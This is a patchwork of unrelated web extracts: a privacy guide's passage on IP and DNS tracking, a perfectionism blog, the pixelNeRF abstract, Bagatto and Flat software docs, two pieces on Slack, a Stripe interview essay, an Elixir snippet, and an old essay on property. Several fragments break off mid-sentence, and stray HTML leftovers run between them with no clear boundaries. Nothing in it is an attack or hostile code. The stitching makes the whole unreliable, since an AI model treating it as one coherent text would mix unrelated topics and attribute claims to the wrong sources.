<p>Your IP address<sup id="fnref:17" role="doc-noteref"><a href="#fn:17">17</a></sup> is the most known and obvious way you can be tracked. That IP is the IP you’re using at the source. This is where you connect to the internet. That IP is usually provided by your ISP (Internet Service Provider) (xDSL, Mobile, Cable, Fiber, Cafe, Bar, Friend, Neighbor). Most countries have data retention regulations<sup id="fnref:18" role="doc-noteref"><a href="#fn:18">18</a></sup> which mandates keeping logs of who is using what IP at a certain time/date for up to several years or indefinitely. Your ISP can tell a third party that you were using a specific IP at a specific date and time, years after the fact. If that IP (the origin one) leaks at any point for any reason, it can be used to track down you directly. In many countries, you won’t be able to have internet access without providing some form of identification to the provider (address, ID, real name, e-mail …).</p>

<p>Useless to say that most platforms (such as social networks) will also keep (sometimes indefinitely) the IP addresses you used to sign-up but also those you used to sign-in.</p>

<p>For those reasons, we’ll need to not use that origin IP (the one tied to your identification) or hide it as much as we can through a combination of various means:</p>

<ul>
  <li>
    <p>Using a public WIFI service (free).</p>
  </li>
  <li>
    <p>Using an anonymous VPN service<sup id="fnref:19" role="doc-noteref"><a href="#fn:19">19</a></sup> (paid by cash).</p>
  </li>
  <li>
    <p>Using the Tor Anonymity Network<sup id="fnref:20" role="doc-noteref"><a href="#fn:20">20</a></sup> (free).</p>
  </li>
</ul>

<p>All those will be explained later in this guide.</p>

<h2 id="your-dns-requests">Your DNS requests:</h2>

<p>DNS stands for “Domain Name System”<sup id="fnref:21" role="doc-noteref"><a href="#fn:21">21</a></sup> and is a service used by your browser (and other apps) to find the IP addresses of a service. It’s pretty much a huge “contact list” (phone book for older people) that works like asking it a name and it returns the number to call. Except it returns an IP instead.</p>

<p>Every time your browser wants to access a certain service such as Google through <a href="https://www.google.com/">https://www.google.com</a>. Your Browser (Chrome or Firefox) will query a DNS service to find the IP addresses of the Google web servers.</p>

<p>Usually the DNS service is provided by your ISP and automatically configured by the network you’re connecting to. This DNS service could also be subject to data retention regulations or will just keep logs for other reasons (data collection for advertising purposes for instance). Therefore this ISP will be capable of …</p></section></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>For me, perfection is that I don't want to have any errors in what I do. It's hard and exhausted to keep everything perfect. When I publish a piece of content, I want it to be perfect. But I always feel something was wrong and afraid someone would point out the error. After all, I just make a little modification and leave it behind because it's wasting time.</p>
<p>I have so much content I want to create. I don't want to stick with a piece of content for too long. When I start creating another piece of content, I try to avoid previous mistakes. I also try something new in it. The joy of creating content is you can try something new and see if it works.</p>
<p>This is the issue that makes me hesitate to create content. I want my content to be useful to my audiences. I also want to create as much content as possible. After trying some ways, I think I should prioritize the quantity rather than quality. Because I can improve my content by creating more. </p>
<p>Now, perfection for me is not the result of a piece of content. It's a process in which I try, modify, and improve pieces by pieces. If I satisfy with a blog post or video, I just publish it and create another. When I find a mistake, I will fix it.</p>

                    We propose pixelNeRF, a learning framework that predicts a continuous neural scene representation conditioned on
                    one or few input images.
                    The existing approach for
                    constructing neural radiance fields&nbsp;<a href="https://www.matthewtancik.com/nerf">[Mildenhall et al. 2020]</a>
                    involves optimizing the representation to every scene independently, requiring many calibrated views and significant compute time.
                    We take a step towards resolving these shortcomings
                    by introducing an architecture that conditions a NeRF on image inputs in a fully convolutional manner. This allows the network to be trained across multiple scenes to learn a scene prior, enabling it to perform novel view synthesis in a feed-forward manner from a sparse set of views (as few as one).

                    Leveraging the volume rendering approach of NeRF, our model can be trained directly from images with no explicit 3D supervision.
                    We conduct extensive experiments on ShapeNet benchmarks for single image novel view synthesis tasks with held-out objects as well as entire unseen categories.
                    We further demonstrate the flexibility of pixelNeRF by demonstrating it on multi-object ShapeNet scenes and real scenes from the DTU dataset. In all cases, pixelNeRF outperforms current state-of-the-art baselines for novel view synthesis and single image 3D reconstruction.

                <h4>Feed-forward NeRF from One View</h4>
                <p>
                    Using multiview image supervision, we train a single pixelNeRF to 13 largest object categories
                    in ShapeNet in order to perform novel-view synthesis on unseen objects.
                    Our approach operates in <strong>view-space</strong>—as opposed to canonical—and requires <strong>no test-time optimization</strong>.
                    Nevertheless, in terms of image metrics, we significantly outperform existing methods quantitatively, as shown in the paper.

                <h4>Scene-level Representation</h4>
                <p>
                    Since our method requires <strong>neither canonical space nor object-level information such as masks</strong>,
                    it can represent scenes with multiple objects, where a canonical space is unavailable,
                    without modification.
                    Our method can also <strong>seemlessly integrate multiple views</strong> at test-time to obtain better results.
                    SRN performs extremely poorly here due to the lack of a consistent canonical space.

                    producing reasonable results when given only 1-3 views at inference time.
                    Moreover, it is feed-forward without requiring test-time optimization for each scene.

<h3 id="the-extensible-transparent-static-site-generator"><a href="#the-extensible-transparent-static-site-generator" rel="nofollow noopener">#</a>The extensible, transparent static site generator</h3>
<p>Bagatto is a static site generator written in <a href="https://janet-lang.org/index.html" rel="nofollow noopener">Janet</a>.</p>
<p>It is inspired most directly by Garrett Smith's <a href="https://github.com/gar1t/lambdapad" rel="nofollow noopener">LambdaPad</a>, a SSG
in Erlang. LambdaPad falls more to code side of the config--code
spectrum, and Bagatto follows that philosophy. Thus, it's designed to
expose the full expressive power and extensiblity of the language it's
written in. Janet is a lisp that's designed for simplicity and ease of
embedding, and thus it's a very good fit for this model.</p>
<p>To create a Bagatto website, you should create a single Janet source
file. Because you're writing normal source code, you have the full
power of the Janet language at your disposal. Bagatto tries to keep
the "magic" to a minimum; in all cases, it tries to make the process
of loading source files and of generating new files completely
transparent, inspectable and extensible.</p>
<h3 id="the-model"><a href="#the-model" rel="nofollow noopener">#</a>The Model</h3>
<p>In Bagatto, a website consists of two things: a <strong>data specification</strong>,
and a <strong>site specification</strong>.</p>
<p>A data specification describes all the inputs into the site
generator. These are of two main types: either Janet values or
references to other source files, eg., JSON configuration files or
Markdown articles. When Bagatto evaluates a data specification, it
loads all of the files and parses them for arbitrary
<strong>attributes</strong>. It includes some baseline attributes, like path and
contents, but allows the site author to specify or implement other
attribute parsers. For instance, it comes with a parser function that
will read the YAML frontmatter from a Markdown file and include those
as additional attributes.</p>
<p>Here's an example data specification:</p>
<div><pre><span></span><span>(</span><span>def </span><span>data</span> <span>{</span><span>:config</span> <span>{</span><span>:attrs</span> <span>{</span><span>:title</span> <span>"A Demo Bagatto Config"</span><span>}}</span>
           <span>:posts</span> <span>{</span><span>:src</span> <span>(</span><span>bagatto/slurp-*</span> <span>"posts/*.md"</span><span>)</span>
                   <span>:attrs</span> <span>parse-post</span><span>}</span>
           <span>:static</span> <span>{</span><span>:src</span> <span>(</span><span>bagatto/*</span> <span>"static/*"</span><span>)</span>
                    <span>:attrs</span> <span>bagatto/parse-base</span><span>}</span>
           <span>:config-json</span> <span>{</span><span>:src</span> <span>"config.json"</span>
                         <span>:attrs</span> <span>bagatto/parse-json</span><span>}</span>
           <span>:config-file</span> <span>{</span><span>:src</span> <span>"config.jdn"</span><span>}})</span>
</pre></div>
<p>A site specification describes all of the outputs of the site
generator: the paths and contents of all the files that the generator
should create. For static files like CSS and images, this might be as
simple as copying the original file to a new path. For the generated
content of the website, this will include rendering <strong>templates</strong> by
using the attributes in the input step.</p>
<p>Here's an example site specification:</p>
<div><pre><span></span><span>(</span><span>def </span><span>site</span> <span>{</span><span>:post-index</span> <span>{</span><span>:path</span> <span>index-path</span>
                        <span>:contents</span> <span>render-post-index</span><span>}</span>
           <span>:posts</span> <span>{</span><span>:each</span> <span>:posts</span>
                   <span>:path</span> <span>make-post-path</span>
                   <span>:contents</span> <span>render-post</span><span>}</span>
           <span>:static</span> <span>{</span><span>:each</span> <span>:static</span>
                    <span>:path</span> <span>make-static-path</span><span>}})</span>
</pre></div>
<h3 id="demo"><a href="#demo" rel="nofollow noopener">#</a>Demo</h3>
<p>A demo project can be seen <a href="https://git.sr.ht/~subsetpark/bagatto/tree/refs/heads/master/demo/index.janet" rel="nofollow noopener">in this
repository</a>. This consists of a simple module
which includes some source files and some rendered pages.</p>
<p>To run it, navigate to the demo directory and then run <code>bag</code>:</p>
<pre><code>code-src/bagatto/demo [master !] ⊕ bag index.janet 
site/index.html
site/static/hello.png
site/posts/blog-post-1046213634.html
site/posts/blog-post-778149589.html
</code></pre>
<p>Bagatto outputs the path of each file it copies or creates.</p>
<p>We can then open up <code>site/index.html</code> in a web browser and click
around. Beware: it's pretty ugly. Both <code>index.janet</code> and the template
files it references are very thoroughly commented; hopefully they can
provide a whirlwind introduction.</p>
<h3 id="manual"><a href="#manual" rel="nofollow noopener">#</a>Manual</h3>
<p>See the <a href="https://git.sr.ht/~subsetpark/bagatto/tree/refs/heads/master/MANUAL.md" rel="nofollow noopener">Manual</a> for a deep dive.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>This blog is a part of the series, <strong><em>How to get your first SAAS customer</em></strong>. You can get the book <a href="https://www.firstsaascustomer.com/" data-splitbee-event="Clicked top blog callout link">here</a>.</p></div><div><p>Stewart Butterfield is apparently an expert at turning computer games into businesses — <em>there also might be a hidden strategy in here</em>. I don't mean monetizing games. I mean taking what you've learned or built with a video game, and building a business off of it. Stewart has founded two massively successful online companies, both of which originated from (or were a product of) video games Stewart and some friends were working on.</p><p>First, Stewart was working on a game called Game Never Ending, which had a very popular photo sharing feature. He then went and built Flikr, the photo sharing app, which he sold shortly after.</p><p>As his next endeavour he and his colleagues decided to start working on an online multiplayer game that was described as "A mix between world of war craft, super mario, and a splash of Doctor Suess". His team was split between a couple cities and they were unsatisfied with their remote communication.</p><p>Stewart built an internal tool so he could chat within anyone on the team, no matter where they were. He realized that this was pretty valuable in and of itself.</p><p>‍</p><figure id="w-node-5e20e900fc9d-c9bb4729"><p><img src="https://assets.website-files.com/5fbed83c9b5bca1ced485e3a/5fc148fcc755c6585611d022_Slack1.png" loading="lazy" alt=""></p><figcaption>Stewart coming up with the SLACK name</figcaption></figure><p>‍</p><p>‍</p><p>‍</p><blockquote>[Internet Relay Chat] has this one fundamental concept called a 'channel' and you send messages to the channel rather than to individuals or to groups of individuals as you do in e-mail or most messaging systems. It’s a fundamental shift because the channel can exist before you arrive and it can exist after you leave, you can look into other channels across the system. When you join the organization, whether it’s the next day or six months later or five years later, all of that stuff is archived in all these different channels. And we slowly, over the course of years, built feature after feature, solved the really irritating problems, took advantage of the obvious opportunities. So now fast forward to 2012 at the end of the year, it was apparent that the game wasn’t going to work, like it just wasn’t going to be viable, it was never going to be the kind of business that would justify the $17 million bucks or venture capital investment we had raised, but we all realized we would never work without a system like this one again and so thought that it might be something that the rest of the world would want," Butterfield says in an interview in 2017.<p><strong>— Steward reflecting on the Slack technology</strong></p></blockquote><p>‍</p><p>After almost 3 years of working on a game, with no encouraging traction, Stewart and team switched to working on Slack.</p><p>The team knew quite a few other friends and old colleagues who worked at other startups. They reached out and begged them to try Slack.</p><p>‍</p><figure><p><img src="https://assets.website-files.com/5fbed83c9b5bca1ced485e3a/5fc14911e38b234d33329445_Slack2.png" loading="lazy" alt=""></p><figcaption>The first slack website</figcaption></figure><p>‍</p><p>‍</p><p>‍</p><p>What separated the Slack team from everyone else was their internal focus on growth. They were fully prepared to make small or large changes, advances, or pivots — evidenced by the huge pivot from a game they had been working on for 3 years to a chat app — to make customers happy.</p><p>Companies had email, phone, and other IRC technology, but Slack made it delightful. They solved the problems they already knew distributed teams were facing. It was baked right into the company name, Searchable Log of All Conversation and Knowledge (SLACK).</p><p>Slack made customer feedback the epicenter of its efforts. They made sure customers were heard, serviced, and supported. Slack worked day and night to fix issues, release improvements, and build the features their customers needed.</p><p>When Slack noticed issues with product adoption at a whole or user adoption within a company, they quickly identified the root cause and developer clever solutions. For example, Slack noticed that new hired when added to a Slack team had difficulty knowing which channels to join (There were usually many), so Slack developed channel descriptions and showed how many people were a part of and using each channel.</p><p>Slack made it dead simple for individuals to convince the rest of their team that they needed Slack, “We created materials to explain Slack to individuals" Stewart said. They explained what it was for, how it worked, what you’re supposed to do. "We also built resources for team administrators. We wanted to give them ammunition to help convince the team", Butterfield says.</p><p>A lot of promotion and ground work was done by their customers. From there, Slack's internal focus on growth, customer feedback, and iteration propelled them into the market.</p><p><strong>Takeaways from Slack</strong></p><ol role="list"><li>Make user feedback your core focus</li><li>Help users to convince themselves and teammates/colleagues/friends</li><li>Pay attention to key user problems</li></ol><p>‍</p></div></div>]]>

		<h4>Flat — Generative infrastructure for Python</h4><p>Flat is a library for creating and manipulating digital forms of fine arts. Its aim is to enable experimentation with and testing of unpredictable or automated processes, to inspect the beginning of the "new".</p><p>It grew out of the needs for generative design, architecture and art. The concept of "design" is more of a subject of study yet to be delved into, hence the fitter term for subtitle is "infrastructure".</p><p>It is written in pure Python and distributed under a liberal license.</p><h4>Content</h4><ul><li><a href="#features">Features</a></li><li><a href="#concepts">Core concepts</a></li><li><a href="#tutorial">Tutorial</a></li><li><a href="#examples">Examples</a></li><li><a href="#reference">API reference</a></li><li><a href="#installation">Installation</a></li><li><a href="#source">Source code</a></li><li><a href="#history">Previous releases</a></li><li><a href="#contact">Contact</a></li></ul><h4><a name="features"></a>Features</h4><ul><li><strong>Graphic formats</strong><ul><li>PNG, JPEG, PDF, SVG, OpenType (both TrueType and PostScript outlines), STL</li></ul></li><li><strong>Color spaces</strong><ul><li>grayscale, grayscale + alpha, RGB, RGBA, CMYK, spot colors, overprint</li></ul></li><li><strong>Image manipulation</strong><ul><li>resizing, blurring, dithering, ...</li></ul></li><li><strong>Image synthesis</strong><ul><li>Bezier path rasterization, BVH accelerated path tracing with explicit emitters and stratified sampling</li></ul></li><li><strong>Vector graphic primitives</strong><ul><li>line, polyline, ..., path, text, outlines, groups and units</li></ul></li><li><strong>Typography</strong><ul><li>kerning, greedy line breaking, threaded text frames</li></ul></li><li><strong>Computational geometry</strong><ul><li>Boolean operation on polygons</li></ul></li><li><strong>Data visualization</strong><ul><li>tree layout</li></ul></li></ul><h4><a name="concepts"></a>Core concepts</h4><p>Flat library consists of three (slightly overlapping) parts: image, document and scene.
An image is basically a container of pixels and a color kind. There are a few methods which operate over those pixels, such as "blur" or "put".
It is possible to create completely new image, by opening a file or by "rasterizing" a page of document.</p><p>Document is then assembled from pages, and each page holds number of "placed" items, both of which can be exported, too.
Here it also makes sense to introduce other entities: colors, shapes and strikes. There is support for following colors or color spaces, if you will:
the usual ones (grayscale, RGB, CMYK, ...), spot colors that can be used for controlling the application of special colorants and "overprint", which allows for printing of a graphic figure without erasing anything below it.
A shape includes both graphical properties such as stroke width or miter limit and means of creating items with said properties that are to be "placed" into a page, for example "line" or "circle".
Strike is a similar combination of text attributes (font, size, color, ...) and a way of constructing text "spans". A span likewise connects text string to text attributes, one or more spans can form a "paragraph", which in turn may form "text" or "outlines". Outlines are similar to texts but they use paths of glyph outlines, instead of characters.
One additional thing to note is that placed texts or outlines may be linked into a story or "chain" of blocks, making the text gradually "flow" from one text frame to another.
Any of the items may be placed into a "group" as well.</p><p>Finally, a scene is made of (possibly light emitting) materials, meshes built of triangular faces defined by "triplets" of 3D vertices and a camera.</p><h4><a name="tutorial"></a>Tutorial</h4><pre><code>from flat import rgb, font, shape, strike, document

red = rgb(255, 0, 0)
lato = font.open('Lato-Reg.otf')
figure = shape().stroke(red).width(2.5)
headline = strike(lato).color(red).size(20, 24)

d = document(100, 100, 'mm')
p = d.addpage()
p.place(figure.circle(50, 50, 20))
p.place(headline.text('Hello world!')).frame(10, 10, 80, 80)
p.image(kind='rgb').png('hello.png')
p.svg('hello.svg')
d.pdf('hello.pdf')
</code></pre><p>Short commentary:</p><p>We first prepared some invariants which we are going to use later, like the body typeface, some RGB color or a typeface we opened from a font file. One can think of <code>shape</code> and <code>strike</code> as of customizable factories which produce more concrete objects, for example lines or spans of text.</p><p>Next is the basic document hierarchy with just one page that can have items be placed into. The origin of coordinate system (0, 0) is at the top left corner and most of the time the default unit is "points" (1 inch = 72 points). A placed item may have some additional properties as position or <code>frame</code>. The latter is used to define the boundaries inside whose the text may run. As Flat currently lacks any kind of color management, we need to use the same color space for rasterizing the page into a PNG file. To access a page at any time one can simply keep a reference to it (<code>p</code>). Lastly, note that PDF is one of the few graphic formats which can hold multiple pages.</p><h4><a name="examples"></a>Examples</h4><p>There is also a public <a href="https://github.com/xxyxyz/flat-examples">repository</a> hosting additional examples.</p><h4><a name="reference"></a>API reference</h4><h4>image.py</h4><ul><li><strong><code>image.open(</code></strong><code>path</code><strong><code>)</code></strong><ul><li><ul><li>Open an image located at <code>path</code>.

<p>Interviewing for a job often is a daunting experience. It may commonly be described as a two-way selection process, one in which the candidate is evaluating the company as much as the company is the candidate, but the sober truth is that outside of the most highly sought-after segments of the talent pool, the balance of power resides squarely with the hiring company and the candidate has little leverage until the moment a job offer is presented. This seemingly is especially true in Silicon Valley, where each job opening routinely attracts hundreds of applicants and it is not uncommon that the candidate simply never hears back from the company in the case the interview is deemed unsuccessful at any point along the process, without even a notice of rejection, let alone being provided an explanation or feedback of any kind. Basic decency and decorum can seem to fly out the window once the company makes the determination you are “not a fit,” which effectively translates to “henceforth a waste of time,” simply an undesired byproduct of an essential process, to be discarded as quickly as possible.</p>



<p>But every once in a while, as is the case with life in general, an exception comes along that runs against the grain of your learned expectations. It shows you the extraordinary does exist and offers a reminder that much of what happens in this world lies on a distribution, despite the seeming tyranny of what occupy the regions of central tendency. While it won’t negate the broadly observed norms, the reminder that excellence exists in almost all domains of human activity sometimes is enough to sustain one in a journey that is full of pitfalls and trials, providing the inspiration that helps keep alive hopes and aspirations even when the objective and dispassionate prognosis appears far from welcoming. Interviewing with Stripe, the payment startup, for me, was such an example.</p>



<p>My very first interview with Stripe started off quite inauspiciously. It was a phone interview with the recruiter, and after spending some time to explore and discuss both my background and that of the job, he let me know that my skill set probably was not as good a match for what the hiring team was looking for as initially thought. In retrospect that sort of upfront candor might have been an early indication of the caliber of the organization that was to be revealed more fully later on. But the remarkable thing that happened after he uttered that assessment was that he wanted to refer me to another recruiter, for a different role which he thought presented a better match. This was something that quite literally had never happened in my experience, admittedly a small sample as it may be – a recruiter that not only was well-versed enough in another position for which he was not recruiting, was empowered enough by the organization to make that kind of an autonomous referral decision without consultation, but also, probably most impressively, cared enough to take on such an initiative when I was deemed no longer useful for his immediate need, which was to fill the position at hand.</p>



<p>The subsequent interviews, for the new role, went more smoothly, uneventfully in the best sense. Over the course of the ensuing few weeks, in succession, I had a phone call with the new recruiter, a Zoom video call with the head of the business unit for the role (who was based overseas), a writing assignment, and in-person coffee shop chats in San Francisco with the said head of the business unit who happened to be in town that week and also with the hiring manager. All of that led to culminate in an on-site round of interviews with 7 individuals that lasted over 4 hours in January of this year at the San Francisco headquarters of Stripe.</p>



<p>In retrospect, it is clear I did not perform as well on the on-site interviews as I should have. What was unique about Stripe was the interview questions were actually provided in advance – the recruiter arranged a call with me prior to the scheduled date to go over the questions one by one. Gripped by the notion, somehow, that interviews are just conversations, however, I did not spend a lot of time preparing specific answers for those questions. Looking back, I now think a big part of the reason why was hubris; I have a tendency to think I enjoy all conversations, and proceeded to draw the conclusion in my mind that conversations I enjoy in an interview setting must be good interviews. The mere fact that I was ready to enjoy the interviews, in their natural, unscripted, conversational formulation, was, in a way, enough preparation. But once the on-site interviews began it became apparent the interviewers were pressing for a higher level of specificity in the answers than I was prepared to give in the courses of casual conversations. I could feel the inadequacy of my answers resulting from the lack of deeper considerations given them in advance, and I simply was not good enough to get to the level of detailed thoughtfulness on the spot. As I was ushered out of the building after the interviews concluded, I recall feeling a sense of regretful uneasiness creeping in. Almost compulsively, I remained hopeful, but far from confident. And surely enough, a few days later I was informed that I didn’t get the job. </p>



<p>I was devastated, but this is the point from which I was led to Stripe revealing itself to be a truly unique, unconventional company in the most unexpectedly wonderful ways. First, the recruiter offered to schedule a call so we could review the decision. I was pleasantly surprised to be given such an unusual opportunity, so I took him up on it. During the call he relayed some useful feedback, though it is clear in retrospect that I got too excited to be on such a call and spent way more time talking than listening to what he had to say. But importantly, the conversation helped me come to a realization, in concrete ways, that I was a much worse interviewee than had previously believed myself to be. It prompted me to ex-examine my natural tendencies in the ways I think, talk, and engage with others in conversations. When I shared the revelation with my wife, she was more than happy to supply additional pointers in areas of my failing.</p>



<p>The fact that the recruiter, and by extension the company, was willing to engage with and spend the time and effort on someone deemed to be “not wanted” was an enormous departure from everything I had experienced previously. Frankly, it was the kind of thoughtfulness and generosity of goodwill that I never expected any corporate entity to possess or display. I knew I had been rejected, but now I wanted Stripe even more, and I couldn’t let myself just give up. So I did something quite silly: I sent an email to the CEO. Fortunately Patrick Collison, Stripe’s CEO, lists his email address on his personal website. But I had no idea if the email would actually reach him, or if he would read it if it got to him, or if he would respond in any way. The overwhelmingly realistic outcome was that nothing would happen, and I knew it. It was a desperation move, one you are able to make only because you have nothing to lose.</p>



<p>Then, I got an email from the recruiter. He asked if I wanted to speak with the company’s chief risk officer – the job I interviewed for was a risk function – for reasons that were not entirely clear. He mentioned I might want “a bit more closure,” but I didn’t want closure; if anything, I wanted to keep the door ajar as much and as long as possible. He also said that the meeting was optional, with “no pressure.” Perplexed yet intrigued, I took up the opportunity to speak with the executive. She began the call with something to the effect of “I know you reached out to Patrick.” I had reached out to everyone I had interviewed with to solicit feedback, and since the name “Patrick” didn’t register right away I processed it to mean one of the interviewers. But about 5 seconds later I realized there was no one named Patrick that I had met, and then it hit me that it must be Patrick Collison, the CEO. My email to him was why this call was happening, which the chief risk officer confirmed when I asked her in disbelief. I was stunned. Having taken place almost a half year ago, much of the details of the call is a blur. But I recall distinctly her asking why Stripe should hire someone like myself. Most improbably, it seemed, this might be a second chance.</p>



<p>I had written to Patrick the CEO with a proposition: I offered myself to be a counterfactual data point in an evaluation of Stripe’s hiring process, after learning that Stripe’s credit card fraud detection system lets through some transactions which its algorithms flag as likely frauds in order to determine whether they turn out to be true positives or false positives – thereby evaluating the algorithms themselves – in a process called “counterfactual evaluation.” When the chief risk officer asked why I should be hired, I reiterated that proposition: the case I was making was not about my merits, but the willingness on Stripe’s part to apply counterfactual evaluation to its hiring process, to determine whether I was a false positive (incorrectly rejected) or a true positive (truly no good) by letting me join Stripe, without a bias to either outcome. I couldn’t tell if I was making any headway with the argument, but we soon ran out of time and she had to go to another meeting.</p>



<p>In the end, the outcome of my interviews did not change and I remain not an employee of Stripe. But out of all the job interview experiences I’ve had in my life, the one with Stripe stands out as singularly remarkable. When I shared my story with a friend she was so impressed that even though she wasn’t looking for a new job, she said she still might apply to Stripe just for the experience. Today Stripe has earned a reputation as one of the best embodiments of the ideals of Silicon Valley – a place of inventive and ambitious companies that not only come up …</p></div></div>

Muhammed Abiodun / Unsplash"></a><figcaption>(Muhammed Abiodun / Unsplash)</figcaption></figure></div><p>Slack’s life as an underdog darling of Silicon Valley ended on November 2, 2016. That’s when the upstart communication startup <a href="https://www.theverge.com/2016/11/2/13497766/slack-microsoft-teams-new-york-times-ad">published an open letter to Microsoft in the </a><em><a href="https://www.theverge.com/2016/11/2/13497766/slack-microsoft-teams-new-york-times-ad">New York Times</a></em>, offering the tech giant an insincere “welcome” to the world of workplace chat software. The occasion was <a href="https://www.theverge.com/2016/10/25/13405200/microsoft-teams-slack-competitor-launch">Microsoft’s launch of Teams</a>, a Slack clone that would come bundled with the company’s popular Office 365 suite of products.</p><p>In its letter, Slack warned Microsoft that “Slack is here to stay,” adding: “we’re just getting started.” But the 4 million users it had at the time would increase to just 12 million four years later, while Microsoft — which added Teams to its 365 bundle without increasing the price — <a href="https://www.theverge.com/2020/10/27/21537286/microsoft-teams-115-million-daily-active-users-stats">took Teams from zero to 115 million users</a>. </p><p>That disparity helps to explain why <a href="https://www.nytimes.com/2020/12/01/technology/salesforce-slack-deal.html">Slack sold itself this week to Salesforce</a>. The deal, which values Slack at $27.7 billion on revenues of $833 million over the past year, has largely been greeted with cheers. (Ben Thompson <a href="https://stratechery.com/2020/salesforce-acquires-slack-salesforces-reasoning-salesforces-opportunity/">offers a typically excellent rundown of the opportunity here for both Salesforce and Slack</a>.)</p><p>But it also feels like the end of an era — one where workers gained new power to bring their own tools to the office, and decide for themselves how they wanted to get work done. Slack first succeeded with small teams who wanted to accelerate their work, and was often dragged into organizations by early adopters. But today, waves of consolidation are leaving people with fewer real choices.</p><p>The rise of smart phones in the early 2010s brought with it a new surge of workplace productivity tools that made mincemeat of everything that had come before them. Box and Dropbox brought easy file storage and sharing. Evernote introduced the idea of ubiquitous, cloud-synchronized note-taking. Sunrise created a more social calendar, while Mailbox and Acompli reimagined email for the mobile phone.</p><p>Slack tiptoed into the conversation in the middle of the decade, and almost immediately became the fastest-growing enterprise software tool of all time. In 2015, just 18 months after it launched, <a href="https://www.theverge.com/2015/6/24/8836087/slack-1-million-daily-users">Slack reported having more than 1 million daily users</a> —&nbsp;a figure then unheard-of in enterprise software.</p><p>It had a great backstory —&nbsp;a last-ditch pivot from a failed video game called Glitch —&nbsp;and, in Stewart Butterfield, one of the tech world’s most charming founders. It also had a bold pitch: it was going to “kill email” —&nbsp;or, at the very least, reduce your reliance on it. And it would do so by integrating hundreds of other services into real-time work chat, creating a kind of all-knowing command console for your organization.</p><p>The company embodied the belief, so common in Silicon Valley, that the best product would win in the end. “Building a product that allows for significant improvements in how people communicate requires a degree of thoughtfulness and craftsmanship that is not common in the development of enterprise software,” the company wrote in its open letter to Microsoft. “How far you go in helping companies truly transform to take advantage of this shift in working is even more important than the individual software features you are duplicating.”</p><p>And yet if there’s a lesson of the past four years, it’s that thoughtfulness and craftsmanship only got the company about 10 percent as far as Microsoft did by copy-pasting Slack’s basic design. In its open letter, Slack famously told Microsoft: “You’ve got to do this with love.” In 2020, looking at Slack’s size, the idea seems laughable. What’s love got to do with it?</p><p>The thing is, I <em>hate</em> that this was the outcome for Slack. I love good productivity tools, and was rooting for Slack to someday become as good as the company hyped it up to be. (And perhaps it still will: like most giants Salesforce has a mixed track record when it comes to the success of its acquisitions, but some seem to be thriving. When I asked about this on Twitter, people had <a href="https://twitter.com/caseynewton/status/1333891286185644032?s=21">a lot of good things to say about post-acquisition Heroku</a>.)</p><p>But Slack’s struggle to succeed as an independent company sadly mirrors that of many one-time innovators in enterprise productivity. Mailbox died and Acompli sold to Microsoft, where it became the mobile Outlook app. Evernote is a pale shadow of its former self. Of that early cohort, only Box and Dropbox became — and still remain —&nbsp;public companies.</p><p>Why is this the case? To get some insight, I called up Aaron Levie, Box’s affable CEO. In Levie’s telling —&nbsp;and he also wrote <a href="https://blog.box.com/salesforce-slack-and-future-work">a blog post about the Slack sale</a> — it all comes down to sales. The idea that workers would someday choose all their own tools was always a fantasy, he told me, in part because most workers don’t event want to think about their tools. In such a world, the winning app will almost always be one with a giant, er, salesforce behind it. </p><p>Microsoft had one. Slack didn’t. Enter Salesforce.</p><p>“The reality with the enterprise is that you can have the best product, but that’s not good enough,” Levie told me. “You need distribution. And what Salesforce has — they have the procurement officers, they have the finance people. They have all of the apparatus you need to interact with to sell software, and they have it for the top 100,000 corporations around the world.”</p><p>Levie is bullish on the acquisition, because it puts Slack and Salesforce on more even ground. </p><p>“The only advantage Microsoft has is distribution, and so now they’ve neutralized the advantage that Microsoft has had,” he said. “All of a sudden, they can actually fulfill the ultimate promise of the opportunity, because they have 10 times the amount of salespeople that can go distribute this thing into corporations around the world.”</p><p>Assuming Levie is right — and I wouldn’t bet against him — that means the medium-term future of work is increasingly a choice between three giants: Microsoft, Salesforce, and (in a distant third) Google.

But I wonder whether the low ceiling that Slack turned out to have has implications for some of the other fast-growing productivity companies of the current moment.

        <p>Seeing the ampersand for the first time in Elixir I wanted to dig deep into what it meant. The first <code>&amp;</code> effectively either gets a reference to the original function or starts an anonymous function. Any ampersand after the first that references the positional argument passed to it. You could use this to write very concise anonymous functions. </p><p>Here's a couple of examples:</p><pre><code>messages = ["One", "Two"]

no_capture_operator = fn msg -&gt;
  IO.inspect(msg, label: 'no_capture_operator')
  %{itemValue: msg}
end
# no_capture_operator: "One"
# no_capture_operator: "Two"

messages |&gt; Enum.map(no_capture_operator)

new_messages = messages |&gt; Enum.map(&amp;%{itemValue: &amp;1})

IO.inspect(new_messages)
# [%{itemValue: "One"}, %{itemValue: "Two"}]

new_messages = messages |&gt; Enum.map(fn msg -&gt;
  IO.inspect(msg)
  %{itemValue: msg}
end)
# "One"
# "Two"

IO.inspect(new_messages, label: "new_messages =")
# new_messages =: [%{itemValue: "One"}, %{itemValue: "Two"}]

message_func = fn msg -&gt;
  IO.inspect(msg)
  %{itemValue: msg}
end

messages |&gt; Enum.map(&amp;message_func.(&amp;1))
# "One"
# "Two"

# the enum tuples have zero-based indexes, hence the + 1
message_with_odd_even = &amp;%{itemValue: &amp;1, type: (if rem(&amp;2 + 1, 2) === 0, do: "even", else: "odd")}

msg_tuple = {"One", 0}

IO.inspect(message_with_odd_even.(elem(msg_tuple, 0), elem(msg_tuple, 1)))
# %{itemValue: "One", type: "odd"}

IO.inspect(message_with_odd_even.("One", 0))
# %{itemValue: "One", type: "odd"}

new_messages = messages |&gt; Enum.with_index |&gt; Enum.map(&amp;message_with_odd_even.(elem(&amp;1, 0), elem(&amp;1, 1)))

IO.inspect(new_messages, label: 'new_messages 2 =')
# new_messages 2 =: [%{itemValue: "One", type: "odd"}, %{itemValue: "Two", type: "even"}]

      <p><a name="justice"></a>We
are often assured by sagacious persons that the civilisation of modern
States is largely based upon respect for the rights of private
property. If that be true, it is also true that such respect cannot be
secured, and ought not, indeed, to be expected, unless property is
associated in the minds of the great mass of the people with ideas of
justice and of reason.</p>
      <p><a name="harmony"></a>It is, therefore,
of the first importance to the country - to any country - that there
should be vigilant and persistent efforts to prevent abuses, to
distribute the public burdens fairly among all classes, and to
establish good laws governing the methods by which wealth may be
acquired. The best way to make private property secure and respected is
to bring the processes by which it is gained into harmony with the
general interests of the public. When and where property is associated
with the idea of reward for services rendered, with the idea of
recompense for high gifts and special aptitudes displayed or for
